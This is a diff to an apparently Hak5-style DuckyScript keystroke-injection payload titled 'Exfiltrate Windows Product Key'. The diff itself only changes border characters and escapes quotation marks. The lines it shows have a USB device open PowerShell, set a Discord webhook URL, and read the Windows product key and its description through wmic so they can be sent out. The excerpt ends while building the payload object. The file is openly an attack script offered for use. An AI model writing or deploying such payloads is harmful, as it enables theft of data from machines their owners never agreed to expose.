@@ -1,11 +1,11 @@
 * REM ###################################################
-* REM #                                                 |
-* REM # Title        : Exfiltrate Windows Product Key   |
-* REM # Author       : Aleff                            |
-* REM # Version      : 1.0                              |
-* REM # Category     : Exfiltration                     |
-* REM # Target       : Windows 10-11                    |
-* REM #                                                 |
+* REM #                                                 #
+* REM # Title        : Exfiltrate Windows Product Key   #
+* REM # Author       : Aleff                            #
+* REM # Version      : 1.0                              #
+* REM # Category     : Exfiltration                     #
+* REM # Target       : Windows 10-11                    #
+* REM #                                                 #
 * REM ###################################################
 
 ATTACKMODE HID
@@ -20,10 +20,10 @@ QUACK DELAY 1000
 QUACK STRING powershell
 QUACK ENTER
 QUACK DELAY 2000
-QUACK STRING $hookUrl = "$DISCORD-WEBHOOK"
+QUACK STRING $hookUrl = \"$DISCORD-WEBHOOK\"
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $exfiltration = @"
+QUACK STRING $exfiltration = @\"
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING $(wmic path softwarelicensingservice get OA3xOriginalProductKey)
@@ -32,7 +32,7 @@ QUACK DELAY 500
 QUACK STRING $(wmic path softwarelicensingservice get OA3xOriginalProductKeyDescription)
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING "@
+QUACK STRING \"@
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING $payload = [PSCustomObject]@{
